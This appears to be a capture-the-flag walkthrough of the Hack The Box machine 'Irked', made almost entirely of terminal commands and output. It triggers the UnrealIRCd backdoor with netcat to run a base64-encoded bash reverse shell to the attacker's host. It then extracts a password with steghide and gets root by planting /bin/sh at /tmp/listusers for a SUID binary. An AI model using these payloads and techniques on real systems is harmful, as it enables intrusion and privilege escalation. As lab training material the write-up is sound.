@@ -1,0 +1,182 @@
+
+
+
+
+UnrealIRCd 3.2.8.1 shipped with a backdoor that allows remote code execution by sending the string AB; to the IRC port.
+
+┌──(kali㉿kali)-[~]
+└─$ echo 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1' | base64                                  
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC80NDQ0IDA+JjEK
+
+
+┌──(kali㉿kali)-[~]
+└─$ echo 'AB; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC80NDQ0IDA+JjEK | base64 -d | bash' | nc 10.10.10.117 65534
+:irked.htb NOTICE AUTH :*** Looking up your hostname...
+:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444        
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.117] 53218
+bash: cannot set terminal process group (605): Inappropriate ioctl for device
+bash: no job control in this shell
+ircd@irked:~/Unreal3.2$ 
+
+
+ircd@irked:/home/djmardov/Documents$ cat .backup
+cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+ircd@irked:/home/djmardov/Documents$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ wget http://10.10.10.117/irked.jpg                                                            
+--2025-08-15 11:58:26--  http://10.10.10.117/irked.jpg
+Connecting to 10.10.10.117:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 34697 (34K) [image/jpeg]
+Saving to: ‘irked.jpg’
+
+irked.jpg                    100%[=============================================>]  33.88K  --.-KB/s    in 0.03s   
+
+2025-08-15 11:58:26 (1.21 MB/s) - ‘irked.jpg’ saved [34697/34697]
+
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg 
+wrote extracted data to "pass.txt".
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ cat pass.txt                                             
+Kab6h+m+bbp2J:HG
+                                                                                                                   
+We use this password to ssh in as djmardov
+
+ircd@irked:/home/djmardov/Documents$ find / -type f -perm -4000 2>/dev/null
+find / -type f -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+ircd@irked:/home/djmardov/Documents$ 
+
+
+ircd@irked:/home/djmardov/Documents$ /usr/bin/viewuser
+/usr/bin/viewuser
+(unknown) :0           2025-08-15 10:34 (:0)
+djmardov pts/0        2025-08-15 11:59 (10.10.14.10)
+sh: 1: /tmp/listusers: not found
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+ircd@irked:/home/djmardov/Documents$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ scp djmardov@10.10.10.117:/usr/bin/viewuser viewuser
+djmardov@10.10.10.117's password: 
+viewuser                                                                          100% 7328   113.0KB/s   00:00    
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+
+
+┌──(kali㉿kali)-[~]
+└─$ r2 -d -e bin.relocs.apply=true ./viewuser
+ERROR: bin.relocs and io.cache should not be used with the current io plugin
+INFO: glibc.fc_offset = 0x00148
+[0xf7fc73e0]> aa
+INFO: Analyze all flags starting with sym. and entry0 (aa)
+INFO: Analyze imports (af@@@i)
+INFO: Analyze entrypoint (af@ entry0)
+INFO: Analyze symbols (af@@@s)
+INFO: Recovering variables (afva@@@F)
+INFO: Analyze all functions arguments/locals (afva@@@F)
+[0xf7fc73e0]> afl
+0x565833f0    1      6 sym.imp.puts
+0x56583400    1      6 sym.imp.system
+0x56583410    1      6 sym.imp.__libc_start_main
+0x56583420    1      6 sym.imp.setuid
+0x56583440    1     49 entry0
+0x56583472    1      4 fcn.56583472
+0x56583490    4     53 sym.deregister_tm_clones
+0x56583579    1      4 sym.__x86.get_pc_thunk.dx
+0x565834d0    4     71 sym.register_tm_clones
+0x56583520    5     71 entry.fini0
+0x56583480    1      4 sym.__x86.get_pc_thunk.bx
+0x56583430    1      6 fcn.56583430
+0x56583570    1      9 entry.init0
+0x56583660    1      2 sym.__libc_csu_fini
+0x56583664    1     20 sym._fini
+0x56583600    4     93 sym.__libc_csu_init
+0x5658357d    1    126 main
+0x565833bc    3     35 sym._init
+0x56583438    1      6 fcn.56583438
+[0xf7fc73e0]> db sym.imp.setuid
+[0xf7fc73e0]> db sym.imp.system
+[0xf7fc73e0]> dc
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+INFO: hit breakpoint at: 0x56583400
+[0x56583400]> dr
+eax = 0x565836ed
+ebx = 0x56585000
+ecx = 0xf7f818e0
+edx = 0x00000000
+esi = 0x56583600
+edi = 0xf7fe1b60
+esp = 0xffa4301c
+ebp = 0xffa43038
+eip = 0x56583400
+eflags = 0x00000296
+oeax = 0xffffffff
+[0x56583400]> psz @ 0x565836ed
+who
+[0x56583400]> px 64 @ 0x565836ed
+- offset -  EDEE EFF0 F1F2 F3F4 F5F6 F7F8 F9FA FBFC  DEF0123456789ABC
+0x565836ed  7768 6f00 2f74 6d70 2f6c 6973 7475 7365  who./tmp/listuse                                               
+0x565836fd  7273 0001 1b03 3b30 0000 0005 0000 00e0  rs....;0........
+0x5658370d  fcff ff4c 0000 0030 fdff ff70 0000 007d  ...L...0...p...}
+0x5658371d  feff ff84 0000 0000 ffff ffb8 0000 0060  ...............`
+[0x56583400]> exit
+Do you want to quit? (Y/n) Y
+Do you want to kill the process? (Y/n) 
+                                                                                                                    
+
+
+djmardov@irked:~$ printf '/bin/sh' > /tmp/listusers
+djmardov@irked:~$ chmod a+x /tmp/listusers
+djmardov@irked:~$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2025-08-15 10:34 (:0)
+djmardov pts/0        2025-08-15 11:59 (10.10.14.10)
+# id
+uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+
+
+
+
+
+
+
